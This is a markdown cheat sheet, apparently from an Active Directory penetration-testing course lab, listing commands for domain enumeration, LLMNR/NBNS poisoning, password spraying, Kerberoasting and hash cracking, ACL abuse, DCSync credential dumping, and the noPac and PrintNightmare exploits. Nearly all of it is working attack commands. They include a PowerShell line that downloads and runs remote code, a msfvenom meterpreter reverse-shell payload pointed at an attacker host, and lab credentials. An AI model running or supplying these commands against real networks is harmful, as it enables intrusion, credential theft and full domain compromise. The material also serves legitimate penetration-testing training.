| ``Get-DomainFileServer`` | Returns a list of servers likely functioning as file servers |

| ``Get-DomainDFSShare`` | Returns all DFS shares for the domain |

| ``Get-DomainGPO`` | Returns all GPOs or specific GPO objects in AD |

| ``.\SharpView.exe Get-DomainGPO \| findstr displayname`` | Return all GPO displaynames |

| ``Get-DomainGPO -ComputerIdentity WS01 \| select displayname`` | Find GPO assigned to specific host |

| ``Get-DomainGPOLocalGroup`` | Lists GPOs that modify local group memberships |

| ``Get-DomainGPOUserLocalGroupMapping`` | Maps users/groups to local groups via GPO correlation |

| ``Get-DomainGPOComputerLocalGroupMapping`` | Maps computers to local group memberships via GPO correlation |

| ``Get-DomainPolicy`` | Returns the default or domain controller policy |

| ``Get-NetLocalGroup`` | Lists local groups on the local/remote machine |

| ``Get-NetLocalGroupMember`` | Lists members of a local group |

| ``.\SharpView.exe Get-NetShare -ComputerName DC01`` | Enumerate open shares on remote machine |

| ``Get-NetShare`` | Lists open shares on the local/remote machine |

| ``Get-NetLoggedon`` | Lists users logged on the local/remote machine |

| ``Get-NetSession`` | Lists sessions on the local/remote machine |

| ``Get-RegLoggedOn`` | Enumerates logged-on users via remote registry |

| ``Get-NetRDPSession`` | Gets RDP/session info from the local/remote machine |

| ``Test-AdminAccess`` | Tests local admin access on local/remote machine |

| ``Test-AdminAccess -ComputerName SQL01`` | Tests local admin access on remote machine |

| ``Get-NetComputerSiteName`` | Gets the AD site of a computer |

| ``Get-WMIRegProxy`` | Gets proxy settings and WPAD config |

| ``Get-WMIRegLastLoggedOn`` | Gets the last logged on user |

| ``Get-WMIRegCachedRDPConnection`` | Gets cached RDP connection info |

| ``Get-WMIRegMountedDrive`` | Gets mounted network drives |

| ``Get-WMIProcess`` | Lists running processes and owners |

| ``Find-InterestingFile`` | Searches for files matching specific criteria |

| ``Find-DomainUserLocation`` | Finds where specific domain users are logged in |

| ``Find-DomainProcess`` | Finds machines where specific processes are running |

| ``Find-DomainUserEvent`` | Finds logon events for specific users |

| ``Find-DomainShare`` | Finds reachable shares on domain machines |

| ``Find-InterestingDomainShareFile`` | Searches shares for interesting files |

| ``Find-LocalAdminAccess`` | Finds machines where user has local admin rights |

| ``Find-DomainLocalGroupMember`` | Enumerates members of local groups on domain machines |

| ``Get-DomainTrust`` | Returns all domain trusts |

| ``Get-ForestTrust`` | Returns all forest trusts |

| ``Get-DomainForeignUser`` | Lists foreign users in local groups |

| ``Get-DomainForeignGroupMember`` | Lists foreign group members |

| ``Get-DomainTrustMapping`` | Recursively enumerates reachable domain trusts |

| ``responder -h`` | Shows options for Responder (Linux) |

| ``hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`` | Cracks NTLMv2 hashes using Hashcat |

| ``Import-Module .\Inveigh.ps1`` | Imports Inveigh PowerShell module |

| ``(Get-Command Invoke-Inveigh).Parameters`` | Lists available parameters for Invoke-Inveigh |

| ``Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`` | Starts Inveigh with LLMNR & NBNS spoofing |

| ``.\Inveigh.exe`` | Starts C# implementation of Inveigh |

| ``$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \| foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }`` | Disables NetBIOS over TCP/IP |

| ``crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`` | Uses `CrackMapExec` and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host. |

| ``rpcclient -U "" -N 172.16.5.5`` | Uses `rpcclient` to discover information about the domain through `SMB NULL` sessions. Performed from a Linux-based host. |

| ``rpcclient $> querydominfo`` | Uses `rpcclient` to enumerate the password policy in a target Windows domain from a Linux-based host. |

| ``enum4linux -P 172.16.5.5`` | Uses `enum4linux` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host. |

| ``enum4linux-ng -P 172.16.5.5 -oA ilfreight`` | Uses `enum4linux-ng` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the `-oA` option. |

| ``ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength`` | Uses `ldapsearch` to enumerate the password policy in a target Windows domain from a Linux-based host. |

| ``net accounts`` | Used to enumerate the password policy in a Windows domain from a Windows-based host. |

| ``Import-Module .\PowerView.ps1`` | Uses the `Import-Module` cmdlet to import the `PowerView.ps1` tool from a Windows-based host. |

| ``Get-DomainPolicy`` | Used to enumerate the password policy in a target Windows domain from a Windows-based host. |

| ``enum4linux -U 172.16.5.5 \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"`` | Uses `enum4linux` to discover user accounts in a target Windows domain, then leverages `grep` to filter the output to just display the user from a Linux-based host. |

| ``rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser`` | Uses `rpcclient` to discover user accounts in a target Windows domain from a Linux-based host. |

| ``crackmapexec smb 172.16.5.5 --users \| awk '{print $5}' > activeuser.txt`` | Uses `CrackMapExec` to discover users (`--users`) in a target Windows domain from a Linux-based host. Uses `awk` to filter to DOMAIN\username and export to file `activeuser.txt`. |

| ``ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "`` | Uses `ldapsearch` to discover users in a target Windows domain, then filters the output using `grep` to show only the `sAMAccountName` from a Linux-based host. |

| ``./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`` | Uses the python tool `windapsearch.py` to discover users in a target Windows domain from a Linux-based host. |

| ``for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done`` | Bash one-liner used to perform a password spraying attack using `rpcclient` and a list of users (`valid_users.txt`) from a Linux-based host. It also filters out failed attempts to make the output cleaner. |

| ``kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`` | Uses `kerbrute` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. |

| ``sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +`` | Uses `CrackMapExec` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using `grep`. |

| ``sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`` | Uses `CrackMapExec` to validate a set of credentials from a Linux-based host. |

| ``Import-Module .\DomainPasswordSpray.ps1`` | Used to import the PowerShell-based tool `DomainPasswordSpray.ps1` from a Windows-based host. |

| ``Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`` | Performs a password spraying attack and outputs (`-OutFile`) the results to a specified file (`spray_success`) from a Windows-based host. |

| ``Get-MpComputerStatus`` | PowerShell cmd-let used to check the status of `Windows Defender Anti-Virus` from a Windows-based host. |

| ``Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`` | PowerShell cmd-let used to view `AppLocker` policies from a Windows-based host. |

| ``$ExecutionContext.SessionState.LanguageMode`` | PowerShell script used to discover the `PowerShell Language Mode` being used on a Windows-based host. Performed from a Windows-based host. |

| ``Find-LAPSDelegatedGroups`` | A `LAPSToolkit` function that discovers `LAPS Delegated Groups` from a Windows-based host. |

| ``Find-AdmPwdExtendedRights`` | A `LAPSTookit` function that checks the rights on each computer with LAPS enabled for any groups with read access and users with `All Extended Rights`. Performed from a Windows-based host. |

| ``Get-LAPSComputers`` | A `LAPSToolkit` function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host. |

| ``xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25`` | Connects to a Windows target using valid credentials. Performed from a Linux-based host. |

| ``sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover more users (`--users`) in a target Windows domain. Performed from a Linux-based host. |

| ``sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover groups (`--groups`) in a target Windows domain. Performed from a Linux-based host. |

| ``sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users`` | Authenticates with a Windows target over `smb` using valid credentials and attempts to check for a list of logged on users (`--loggedon-users`) on the target Windows host. Performed from a Linux-based host. |

| ``sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover any smb shares (`--shares`). Performed from a Linux-based host. |

| ``sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share`` | Authenticates with a Windows target over `smb` using valid credentials and utilizes the CrackMapExec module (`-M`) `spider_plus` to go through each readable share (`Dev-share`) and list all readable files. The results are outputted in `JSON`. Performed from a Linux-based host. |

| ``smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`` | Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (`-H`). Performed from a Linux-based host. |

| ``smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only`` | Enumerates the target Windows domain using valid credentials and performs a recursive listing (`-R`) of the specified share (`SYSVOL`) and only outputs a list of directories (`--dir-only`) in the share. Performed from a Linux-based host. |

| ``rpcclient $> queryuser 0x457`` | Enumerates a target user account in a Windows domain using its relative identifier (`0x457`). Performed from a Linux-based host. |

| ``rpcclient $> enumdomusers`` | Discovers user accounts in a target Windows domain and their associated relative identifiers (`rid`). Performed from a Linux-based host. |

| ``psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125`` | Impacket tool used to connect to the `CLI` of a Windows target via the `ADMIN$` administrative share with valid credentials. Performed from a Linux-based host. |

| ``wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`` | Impacket tool used to connect to the `CLI` of a Windows target via `WMI` with valid credentials. Performed from a Linux-based host. |

| ``windapsearch.py -h`` | Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host. |

| ``python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da`` | Used to enumerate the domain admins group (`--da`) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host. |

| ``python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU`` | Used to perform a recursive search (`-PU`) for users with nested permissions using valid credentials. Performed from a Linux-based host. |

| ``sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`` | Executes the python implementation of BloodHound (`bloodhound.py`) with valid credentials and specifies a name server (`-ns`) and target Windows domain (`inlanefreight.local`) as well as runs all checks (`-c all`). Runs using valid credentials. Performed from a Linux-based host. |

| ``Get-Module`` | PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host. |

| ``Import-Module ActiveDirectory`` | Loads the `Active Directory` PowerShell module from a Windows-based host. |

| ``Get-ADDomain`` | PowerShell cmd-let used to gather Windows domain information from a Windows-based host. |

| ``Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`` | PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by `ServicePrincipalName`. Performed from a Windows-based host. |

| ``Get-ADTrust -Filter *`` | PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (`-Filter *`). Performed from a Windows-based host. |

| ``Get-ADGroup -Filter * \| select name`` | PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (`select name`). Performed from a Windows-based host. |

| ``Get-ADGroup -Identity "Backup Operators"`` | PowerShell cmd-let used to search for a specifc group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |

| ``Get-ADGroupMember -Identity "Backup Operators"`` | PowerShell cmd-let used to discover the members of a specific group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |

| ``Export-PowerViewCSV`` | PowerView script used to append results to a `CSV` file. Performed from a Windows-based host. |

| ``ConvertTo-SID`` | PowerView script used to convert a `User` or `Group` name to it's `SID`. Performed from a Windows-based host. |

| ``Get-DomainSPNTicket`` | PowerView script used to request the kerberos ticket for a specified service principal name (`SPN`). Performed from a Windows-based host. |

| ``Get-Domain`` | PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host. |

| ``Get-DomainController`` | PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host. |

| ``Get-DomainUser`` | PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host. |

| ``Get-DomainComputer`` | PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host. |

| ``Get-DomainGroup`` | PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host. |

| ``Get-DomainOU`` | PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host. |

| ``Find-InterestingDomainAcl`` | PowerView script used to find object `ACLs` in the domain with modification rights set to non-built in objects. Performed from a Windows-based host. |

| ``Get-DomainGroupMember`` | PowerView script used to return the members of a specific domain group. Performed from a Windows-based host. |

| ``Get-DomainFileServer`` | PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host. |

| ``Get-DomainDFSShare`` | PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host. |

| ``Get-DomainGPO`` | PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host. |

| ``Get-DomainPolicy`` | PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host. |

| ``Get-NetLocalGroup`` | PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host. |

| ``Get-NetLocalGroupMember`` | PowerView script enumerate members of a specific local group. Performed from a Windows-based host. |

| ``Get-NetShare`` | PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host. |

| ``Get-NetSession`` | PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host. |

| ``Test-AdminAccess`` | PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host. |

| ``Find-DomainUserLocation`` | PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host. |

| ``Find-DomainShare`` | PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host. |

| ``Find-InterestingDomainShareFile`` | PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host. |

| ``Find-LocalAdminAccess`` | PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host. |

| ``Get-DomainTrust`` | PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host. |

| ``Get-ForestTrust`` | PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host. |

| ``Get-DomainForeignUser`` | PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host. |

| ``Get-DomainForeignGroupMember`` | PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host. |

| ``Get-DomainTrustMapping`` | PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host. |

| ``Get-DomainGroupMember -Identity "Domain Admins" -Recurse`` | PowerView script used to list all the members of a target group (`"Domain Admins"`) through the use of the recurse option (`-Recurse`). Performed from a Windows-based host. |

| ``Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`` | PowerView script used to find users on the target Windows domain that have the `Service Principal Name` set. Performed from a Windows-based host. |

| ``.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data`` | Runs a tool called `Snaffler` against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host. |

| ``sudo python3 -m http.server 8001`` | Starts a python web server for quick hosting of files. Performed from a Linux-basd host. |

| ``"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"`` | PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. |

| ``impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/`` | Starts a impacket `SMB` server for quick hosting of a file. Performed from a Windows-based host. |

| ``sudo python3 -m pip install .`` | Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. |

| ``GetUserSPNs.py -h`` | Impacket tool used to display the options and functionality of `GetUserSPNs.py` from a Linux-based host. |

| ``GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday`` | Impacket tool used to get a list of `SPNs` on the target Windows domain from a Linux-based host. |

| ``GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request`` | Impacket tool used to download/request (`-request`) all TGS tickets for offline processing from a Linux-based host. |

| ``GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev`` | Impacket tool used to download/request (`-request-user`) a TGS ticket for a specific user account (`sqldev`) from a Linux-based host. |

| ``GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs`` | Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (`-outputfile sqldev_tgs`). Performed from a Linux-based host. |

| ``hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force`` | Attempts to crack the Kerberos (`-m 13100`) ticket hash (`sqldev_tgs`) using `hashcat` and a wordlist (`rockyou.txt`) from a Linux-based host. |

| ``setspn.exe -Q */*`` | Used to enumerate `SPNs` in a target Windows domain from a Windows-based host. |

| ``Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`` | PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. |

| ``setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`` | Used to download/request all TGS tickets from a Windows-based host. |

| ``mimikatz ## base64 /out:true`` | `Mimikatz` command that ensures TGS tickets are extracted in `base64` format from a Windows-based host. |

| ``kerberos::list /export`` | `Mimikatz` command used to extract the TGS tickets from a Windows-based host. |

| ``echo "<base64 blob>" \| tr -d \\n`` | Used to prepare the base64 formatted TGS ticket for cracking from a Linux-based host. |

| ``cat encoded_file \| base64 -d > sqldev.kirbi`` | Used to output a file (`encoded_file`) into a .kirbi file in base64 (`base64 -d > sqldev.kirbi`) format from a Linux-based host. |

| ``python2.7 kirbi2john.py sqldev.kirbi`` | Used to extract the `Kerberos ticket`. This also creates a file called `crack_file` from a Linux-based host. |

| ``sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`` | Used to modify the `crack_file` for `Hashcat` from a Linux-based host. |

| ``cat sqldev_tgs_hashcat`` | Used to view the prepared hash from a Linux-based host. |

| ``hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`` | Used to crack the prepared Kerberos ticket hash (`sqldev_tgs_hashcat`) using a wordlist (`rockyou.txt`) from a Linux-based host. |

| ``Import-Module .\PowerView.ps1; Get-DomainUser * -spn \| select samaccountname`` | Uses PowerView tool to extract `TGS Tickets`. Performed from a Windows-based host. |

| ``Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat`` | PowerView tool used to download/request the TGS ticket of a specific user and automatically format it for `Hashcat` from a Windows-based host. |

| ``Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation`` | Exports all TGS tickets to a `.CSV` file (`ilfreight_tgs.csv`) from a Windows-based host. |

| ``cat .\ilfreight_tgs.csv`` | Used to view the contents of the .csv file from a Windows-based host. |

| ``.\Rubeus.exe`` | Used to view the options and functionality possible with the tool `Rubeus`. Performed from a Windows-based host. |

| ``.\Rubeus.exe kerberoast /stats`` | Used to check the kerberoast stats (`/stats`) within the target Windows domain from a Windows-based host. |

| ``.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`` | Used to request/download TGS tickets for accounts with the `admin` count set to `1` then formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host. |

| ``.\Rubeus.exe kerberoast /user:testspn /nowrap`` | Used to request/download a TGS ticket for a specific user (`/user:testspn`) then formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host. |

| ``.\Rubeus.exe kerberoast /tgtdeleg /user:testuser /nowrap`` | Used to request/download a RC4 ticket instead of AES. Doesn't work on Windows Server 2019+. |

| ``Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`` | PowerView tool used to check the `msDS-SupportedEncryptionType` attribute associated with a specific user account (`testspn`). Performed from a Windows-based host. |

| ``hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt`` | Used to attempt to crack the ticket hash using a wordlist (`rockyou.txt`) from a Linux-based host. |

| ``Find-InterestingDomainAcl`` | PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. |

| ``Import-Module .\PowerView.ps1  $sid = Convert-NameToSid wley`` | Used to import PowerView and retrieve the `SID` of a specific user account (`wley`) from a Windows-based host. |

| ``Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}`` | Used to find all Windows domain objects that the user has rights over by mapping the user's `SID` to the `SecurityIdentifier` property from a Windows-based host. |

| ``$guid= "00299570-246d-11d0-a768-00aa006e0529"   Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl`` | Used to perform a reverse search & map to a `GUID` value from a Windows-based host. |

| ``Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid} `` | Used to discover a domain object's ACL by performing a search based on GUID's (`-ResolveGUIDs`) from a Windows-based host. |

| ``Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName > ad_users.txt`` | Used to discover a group of user accounts in a target Windows domain and add the output to a text file (`ad_users.txt`) from a Windows-based host. |

| ``foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}`` | A `foreach loop` used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(`ad_users.txt`) to the `Get-ADUser` cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. |

| ``$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) `` | Used to create a `PSCredential Object` from a Windows-based host. |

| ``$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`` | Used to create a `SecureString Object` from a Windows-based host. |

| ``Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`` | PowerView tool used to change the password of a specifc user (`damundsen`) on a target Windows domain from a Windows-based host. |

| ``Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members`` | PowerView tool used view the members of a target security group (`Help Desk Level 1`) from a Windows-based host. |

| ``Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`` | PowerView tool used to add a specifc user (`damundsen`) to a specific security group (`Help Desk Level 1`) in a target Windows domain from a Windows-based host. |

| ``Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName`` | PowerView tool used to view the members of a specific security group (`Help Desk Level 1`) and output only the username of each member (`Select MemberName`) of the group from a Windows-based host. |

| ``Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`` | PowerView tool used create a fake `Service Principal Name` given a sepecift user (`adunn`) from a Windows-based host. |

| ``Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`` | PowerView tool used to remove the fake `Service Principal Name` created during the attack from a Windows-based host. |

| ``Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`` | PowerView tool used to remove a specific user (`damundsent`) from a specific security group (`Help Desk Level 1`) from a Windows-based host. |

| ``ConvertFrom-SddlString`` | PowerShell cmd-let used to covert an `SDDL string` into a readable format. Performed from a Windows-based host. |

| ``Get-DomainUser -Identity adunn  \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl`` | PowerView tool used to view the group membership of a specific user (`adunn`) in a target Windows domain. Performed from a Windows-based host. |

| ``$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl`` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool `Get-ObjectAcl` to check a specific user's replication rights. Performed from a Windows-based host. |

| ``secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss`` | Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host. |

| ``mimikatz ## lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`` | Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host. |

| ``Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`` | PowerView based tool to used to enumerate the `Remote Desktop Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |

| ``Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"`` | PowerView based tool to used to enumerate the `Remote Management Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |

| ``$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force`` | Creates a variable (`$password`) set equal to the password (`Klmcargo2`) of a user from a Windows-based host. |

| ``$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)`` | Creates a variable (`$cred`) set equal to the username (`forend`) and password (`$password`) of a target domain account from a Windows-based host. |

| ``Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred`` | Uses the PowerShell cmd-let `Enter-PSSession` to establish a PowerShell session with a target over the network (`-ComputerName ACADEMY-EA-DB01`) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (`$cred` & `$password`). |

| ``evil-winrm -i 10.129.201.234 -u forend`` | Used to establish a PowerShell session with a Windows target from a Linux-based host using `WinRM`. |

| ``Import-Module .\PowerUpSQL.ps1`` | Used to import the `PowerUpSQL` tool. |

| ``Get-SQLInstanceDomain`` | PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host. |

| ``sudo git clone https://github.com/Ridter/noPac.git`` | Used to clone a `noPac` exploit using git. Performed from a Linux-based host. |

| ``sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and gain a SYSTEM shell (`-shell`). Performed from a Linux-based host. |

| ``sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and perform a `DCSync` attack against the built-in Administrator account on a Domain Controller from a Linux-based host. |

| ``git clone https://github.com/cube0x0/CVE-2021-1675.git`` | Used to clone a PrintNightmare exploit  using git from a Linux-based host. |

| ``pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install`` | Used to ensure the exploit author's (`cube0x0`) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. |

| ``rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'`` | Used to check if a Windows target has `MS-PAR` & `MSRPRN` exposed from a Linux-based host. |

| ``msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll`` | Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host. |

| ``sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`` | Used to create an SMB server and host a shared folder (`CompData`) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host. |

| ``sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'`` | Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host. |

| ``sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`` | Impacket tool used to create an `NTLM relay` by specifiying the web enrollment URL for the `Certificate Authority` host. Perfomred from a Linux-based host. |

